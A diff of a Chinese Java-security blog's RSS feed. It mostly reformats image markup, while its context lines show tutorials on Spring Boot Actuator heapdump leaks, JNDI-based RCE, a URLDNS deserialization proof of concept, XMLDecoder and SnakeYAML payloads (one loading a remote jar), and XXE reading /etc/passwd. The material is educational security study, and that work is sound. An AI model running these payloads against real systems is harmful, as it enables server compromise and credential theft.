@@ -6,7 +6,7 @@
     
             <link href="https://l1uyun.one/tags/sec/javasec/" rel="alternate" type="text/html" title="html" />
             <link href="https://l1uyun.one/tags/sec/javasec/index.xml" rel="alternate" type="application/rss+xml" title="rss" />
-    <updated>2025-09-03T01:13:55+00:00</updated>
+    <updated>2025-09-04T12:43:56+00:00</updated>
     
     
     
@@ -95,19 +95,44 @@ POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh �
 <h2 id="漏洞检测">漏洞检测</h2>
 <h3 id="检测清单">检测清单</h3>
 <p><a href="https://github.com/LandGrey/SpringBootVulExploit" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/LandGrey/SpringBootVulExploit</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_1.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_2.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_1.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_2.png" alt="" /></figure>
+
+
+</p>
 <h3 id="黑盒发现">黑盒发现</h3>
 <p>人工识别，BP插件</p>
 <p>人工识别
 1、网站图片文件是一个绿色的树叶。2、特有的报错信息。3、Whitelabel Error Page关键字
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_3.png" alt="|750"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_3.png" alt="|750" /><figcaption>|750</figcaption></figure>
+
+
+</p>
 <p>BP插件
 <a href="https://github.com/API-Security/APIKit" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/API-Security/APIKit</a>
 打开BurpSuite页面,点击Extender然后选择Extensions,添加APIKit.jar
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_4.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_4.png" alt="" /></figure>
+
+
+
 安装好插件后啥都不用管，让数据包经过BP即可触发插件被动扫描
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_5.png" alt="|800"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_5.png" alt="|800" /><figcaption>|800</figcaption></figure>
+
+
+</p>
 <h3 id="白盒发现">白盒发现</h3>
 <p>pom.xml,引用库</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
@@ -115,60 +140,205 @@ POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh �
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>spring-boot-starter-actuator<span style="color:#f92672">&lt;/artifactId&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
 </span></span></code></pre></div><p>配置文件Actuator设置全部暴露<code>management.endpoints.web.exposure.include=*</code>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_6.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_7.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_6.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_7.png" alt="" /></figure>
+
+
+</p>
 <h2 id="信息泄露利用">信息泄露利用</h2>
 <h3 id="内部路由泄露">内部路由泄露</h3>
 <p><a href="https://github.com/AabyssZG/SpringBoot-Scan" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/AabyssZG/SpringBoot-Scan</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_8.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_9.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_8.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_9.png" alt="" /></figure>
+
+
+</p>
 <h3 id="heapdump敏感信息查询">heapdump敏感信息查询</h3>
 <p>配置密码，AK/SK等</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_10.png" alt="|800"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_10.png" alt="|800" /><figcaption>|800</figcaption></figure>
+
+
+</p>
 <p>下载下来
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_11.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_11.png" alt="" /></figure>
+
+
+
 然后使用JDumpSPider工具来获取数据
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_12.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_12.png" alt="" /></figure>
+
+
+</p>
 <p>![](<a href="https://img.l1uyun.one/Pasted" target="_blank" rel="noopener nofollow noreferrer" >https://img.l1uyun.one/Pasted</a> image 20240806101506.png)</p>
 <p>这里还有另外一款工具,支持关键词搜索
 <a href="https://github.com/wyzxxz/heapdump_tool" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/wyzxxz/heapdump_tool</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_14.png" alt="|750"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_15.png" alt="|850"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_16.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_14.png" alt="|750" /><figcaption>|750</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_15.png" alt="|850" /><figcaption>|850</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_16.png" alt="" /></figure>
+
+
+</p>
 <h2 id="漏洞利用">漏洞利用</h2>
 <h3 id="框架漏洞">框架漏洞</h3>
 <p><a href="https://github.com/AabyssZG/SpringBoot-Scan" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/AabyssZG/SpringBoot-Scan</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_17.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_18.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_19.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_17.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_18.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_19.png" alt="" /></figure>
+
+
+</p>
 <h3 id="利用类漏洞来进行rce攻击">利用类漏洞来进行RCE攻击</h3>
 <p>服务器上执行JNDIExploit工具(可以本地、也可以远程VPS上运行)
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_20.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_21.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_22.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_23.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_20.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_21.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_22.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_23.png" alt="" /></figure>
+
+
+</p>
 <h1 id="cms源码审计">CMS源码审计</h1>
 <h2 id="安装源码">安装源码</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_24.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_25.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_26.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_27.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_28.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_29.png" alt=""  />
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_24.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_25.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_26.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_27.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_28.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_29.png" alt="" /></figure>
+
+
+
 起始就是把actuator的接口做了可视化
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_30.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_30.png" alt="" /></figure>
+
+
+</p>
 <h2 id="源码审计">源码审计</h2>
 <p>从pom.xml看有没有调用Actuator库
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_31.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_31.png" alt="" /></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>配置文件中Actuator设置是否为*(全部暴露)
 </span></span><span style="display:flex;"><span>management.endpoints.web.exposure.include=*
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_32.png" alt="|700"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_33.png" alt="|700"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_32.png" alt="|700" /><figcaption>|700</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_33.png" alt="|700" /><figcaption>|700</figcaption></figure>
+
+
+</p>
 <p>泄露安全(heapdump)
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_34.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_34.png" alt="" /></figure>
+
+
+
 使用heapdump敏感信息查询工具提取敏感信息
 JDumpSpider
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_35.png" alt="|750"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_35.png" alt="|750" /><figcaption>|750</figcaption></figure>
+
+
+</p>
 <h1 id="一句话总结">一句话总结</h1>
 <p>遇到springboot框架从两个方面去寻找安全问题：
 1.泄露安全(是否泄露了内部路由及heapdump)
@@ -389,7 +559,12 @@ JDumpSpider
 </span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> hashCode;
 </span></span><span style="display:flex;"><span>  }
 </span></span></code></pre></div><p>这里会先判断hashCode是否为-1，如果不为-1则直接返回hashCode，也就是说我们只要在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询。(hashCode默认值为-1)
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_1.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_1.png" alt="" /></figure>
+
+
+
 这里的hashCode是private修饰的，所以我们需要通过反射来修改其值</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
@@ -401,7 +576,12 @@ JDumpSpider
 </span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(url,123); <span style="color:#75715e">//调用map.put 此时将不会再触发dns查询</span>
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>此时输出url的hashCode为123，证明修改成功。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_2.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_2.png" alt="" /></figure>
+
+
+
 当put完毕之后再将url的hashCode修改为-1，确保在反序列化调用hashCode方法时能够正常进行，下面是完整的POC</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>URLDNS.<span style="color:#a6e22e">java</span>
 </span></span><span style="display:flex;"><span>
@@ -602,7 +782,12 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>ObjectInputStream.readObject,将对象给恢复,调用恢复对象的readObject方法,执行命令
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_1.png" alt="|600"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_1.png" alt="|600" /><figcaption>|600</figcaption></figure>
+
+
+</p>
 <h4 id="xmldecoder">XMLDecoder</h4>
 <p>也是一样的,只不过是换成了xmldecode.readObject</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。在项目中应禁止使用XMLDecoder方式解析XML内容</span>
@@ -638,7 +823,12 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;void</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;start&#34;</span> <span style="color:#f92672">/&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/object&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/java&gt;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_2.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_2.png" alt="" /></figure>
+
+
+</p>
 <h4 id="snakeyaml">SnakeYaml</h4>
 <p>SnakeYAML 反序列化,
 SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
@@ -656,7 +846,12 @@ SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">!!java.net.URL</span> [<span style="color:#e6db74">&#34;http://192.168.10.7:8000/yaml-payload.jar&#34;</span>]
 </span></span><span style="display:flex;"><span>  ]]
 </span></span><span style="display:flex;"><span>]
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_3.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_3.png" alt="" /></figure>
+
+
+</p>
 <h3 id="安全代码">安全代码</h3>
 <h4 id="黑白名单">黑白名单</h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 使用Apache Commons IO的ValidatingObjectInputStream，accept方法来实现反序列化类白/黑名单控制</span>
@@ -696,12 +891,22 @@ SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 白盒发现（特征类接口函数）</p>
 <h3 id="白盒">白盒</h3>
 <p>看是否用到了这些库,以及上面那些函数吧
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_4.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_4.png" alt="" /></figure>
+
+
+</p>
 <h3 id="黑盒">黑盒</h3>
 <p>黑盒的话看流量,看特征码
 java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，</p>
 <p>burp插件
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_5.png" alt="|600"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_5.png" alt="|600" /><figcaption>|600</figcaption></figure>
+
+
+</p>
 <p>需要配置一下ysoserial(一款java反序列化漏洞payload生成器)的路径</p>
 <h1 id="一句话总结">一句话总结</h1>
 <p>反序列化时会调用被反序列化对象的readObject方法,当这个方法被重写后,就会导致漏洞产生</p>
@@ -794,8 +999,18 @@ SYSTEM、PUBLIC是外部资源的申请</p>
 <p>（通用实体、参数实体）</p>
 <p>1)内部实体
 所谓内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_1.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_1.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt="" /></figure>
+
+
+
 使用&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被“test”替换。</p>
 <p>在XML内部声明DTD:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
@@ -818,22 +1033,42 @@ SYSTEM、PUBLIC是外部资源的申请</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY entityName PUBLIC &#34;publicID&#34; &#34;fileName&#34;&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY example PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;html4-transitional.dtd&#34;&gt;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_3.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_3.png" alt="" /></figure>
+
+
+
 有些XML文档包含system标识符定义的“实体”，这些文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。
 假如 SYSTEM 后面的内容可以被攻击者控制，那么攻击者就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd）或者远程文件（http://www.baidu.com/abc.txt）。</p>
 <p>3）通用实体
 用”&amp;实体名“引用的实体，在DTD中定义，在XML文档中引用。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_4.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_4.png" alt="" /></figure>
+
+
+</p>
 <p>4）参数实体
 使用<code>% 实体名</code>（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用<code>%实体名;</code>引用
 只有在DTD文件中，参数实体的声明才能引用其他实体
 和通用实体一样，参数实体也可以外部引用
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_5.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_5.png" alt="" /></figure>
+
+
+</p>
 <h3 id="xxe">XXE</h3>
 <p>XXE（XML External Entity Injection，XML 外部实体注入）是一种安全漏洞，通常发生在解析 XML 数据时。攻击者通过在 XML 文档中注入外部实体来读取本地文件、发送数据到远程服务器，甚至执行其他恶意操作。
 XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全问题。</p>
 <p>XXE漏洞之所以名为外部实体漏洞，就是因为问题主要出自于外部资源的申请以及外部实体的引用这部分特性中。我们从XXE的全称（XML外部实体注入）可以看出，XXE也是一种XML注入，只不过注入的是XML外部实体罢了。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_6.png" alt="|500"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_6.png" alt="|500" /><figcaption>|500</figcaption></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [  
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
